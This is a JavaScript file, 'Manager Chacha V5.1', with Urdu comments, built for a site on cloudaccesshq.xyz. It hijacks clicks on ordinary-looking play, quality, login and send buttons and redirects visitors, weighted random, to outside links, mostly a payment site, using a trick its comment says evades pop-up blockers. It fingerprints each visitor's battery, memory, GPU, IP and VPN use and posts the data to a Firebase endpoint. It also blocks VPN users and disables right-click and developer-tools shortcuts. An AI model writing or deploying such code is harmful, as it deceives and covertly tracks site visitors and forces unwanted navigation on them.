/**
 * THE OMNI-ENGINE - MANAGER CHACHA V5.1 (SILENT LIMIT)
 * Fixed: ID Syntax, New Tab Issue, Silent 9-Click for Testing
 */

const CHACHA_CONFIG = {
    DEBUG_MODE: true, // ٹیسٹنگ کے دوران اسے true رکھیں

    LINKS: [
        "https://www.blackbox.ai/", "https://chat.deepseek.com/", "https://chatgpt.com/", 
        "https://www.theverge.com/tech", "https://tech.com.pk/", "https://techcrunch.com/", 
        "https://www.techmeme.com/", "https://rocketpay.co.in/", "https://www.api.org/", "https://www.ibm.com/",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in"
    ],
    APIS: {
        IP_KEY: "YOUR_IP_KEY",
        FB_URL: "YOUR_FIREBASE_URL",
        TG_TOKEN: "YOUR_BOT_TOKEN",
        TG_ID: "YOUR_CHAT_ID"
    },
    SETTINGS: {
        MAX_CLICKS: 9,
        CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached",
        DOMAIN: "cloudaccesshq.xyz"
    }
};

const _0xEngine = {
    _c: parseInt(localStorage.getItem('_m_c_')) || 0,
    _baskets: { h: [], n: [], l: [] },

    init: function() {
        if (!CHACHA_CONFIG.DEBUG_MODE && !window.location.hostname.includes(CHACHA_CONFIG.SETTINGS.DOMAIN)) return;
        
        this._baskets.h = CHACHA_CONFIG.LINKS.slice(0, 10);
        this._baskets.n = CHACHA_CONFIG.LINKS.slice(10, 16);
        this._baskets.l = CHACHA_CONFIG.LINKS.slice(16, 20);
        
        if (!CHACHA_CONFIG.DEBUG_MODE) this._lock();
    },

    _scan: async function() {
        try {
            const _bat = await navigator.getBattery().catch(() => ({ level: 1 }));
            const _ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
            
            return {
                b: Math.round(_bat.level * 100) + "%",
                r: navigator.deviceMemory || "N/A",
                g: this._gpu(),
                v: _ipData.proxy || _ipData.vpn || false,
                ip: _ipData.ip || "0.0.0.0"
            };
        } catch(e) { return { v: false }; }
    },

    _gpu: function() {
        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
        return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Std";
    },

    _jump: function(_u) {
        if(CHACHA_CONFIG.DEBUG_MODE) console.log("[DEBUG] Triggering New Tab: " + _u);
        
        // NEW TAB FIX: Pop-up blockers کو چکمہ دینے کا طریقہ
        const _newTab = window.open('about:blank', '_blank');
        if (_newTab) {
            _newTab.location.href = _u;
            _newTab.focus();
        } else {
            // اگر براؤزر سخت بلاکر استعمال کر رہا ہے تو اسی پیج پر کھولے گا
            window.location.assign(_u);
        }
    },

    _log: function(_id, _dna) {
        if (CHACHA_CONFIG.DEBUG_MODE) console.table(_dna);
        
        // Firebase URL چیک کرنے کے بعد ڈیٹا بھیجے گا
        if (CHACHA_CONFIG.APIS.FB_URL.startsWith('http')) {
            fetch(`${CHACHA_CONFIG.APIS.FB_URL}/logs.json`, { 
                method: 'POST', 
                body: JSON.stringify({ btn: _id, dna: _dna, ts: new Date().toISOString() }) 
            }).catch(e => console.error("Log Error"));
        }
    },

    _lock: function() {
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.onkeydown = e => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
    }
};

// --- Click Logic ---
document.addEventListener('click', async (e) => {
    const _btn = e.target.closest('[id]');
    
    // IDs کو درست فارمیٹ میں کر دیا گیا ہے
    const _validIds = [
        'tag-btn-play-main', 
        'tag-input-message-field', 
        'tag-btn-back-button', 
        'tag-btn-server-shift-2', 
        'tag-btn-q-360', 
        'tag-btn-q-720', 
        'tag-btn-q-1080', 
        'tag-btn-q-4k', 
        'tag-btn-auth-login', 
        'tag-btn-auth-send', 
        'tag-link-community-rules', 
        'tag-btn-community-showmore'
    ];

    if (_btn && _validIds.includes(_btn.id)) {
        
        // SILENT 9-CLICK LOGIC
        if (_0xEngine._c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS) {
            if (CHACHA_CONFIG.DEBUG_MODE) {
                console.warn("[DEBUG] Click limit (9) exceeded, but continuing due to DEBUG_MODE.");
            } else {
                window.location.href = CHACHA_CONFIG.SETTINGS.CLEAN_PAGE;
                return;
            }
        }

        const _dna = await _0xEngine._scan();
        if (_dna.v && !CHACHA_CONFIG.DEBUG_MODE) {
            alert("VPN Detected! Access Denied.");
            return;
        }

        _0xEngine._log(_btn.id, _dna);

        const _luck = Math.random() * 100;
        let _pool = _luck < 80 ? _0xEngine._baskets.h : (_luck < 90 ? _0xEngine._baskets.n : _0xEngine._baskets.l);
        const _finalLink = _pool[Math.floor(Math.random() * _pool.length)];

        _0xEngine._c++;
        localStorage.setItem('_m_c_', _0xEngine._c);
        
        _0xEngine._jump(_finalLink);
    }
});

_0xEngine.init();
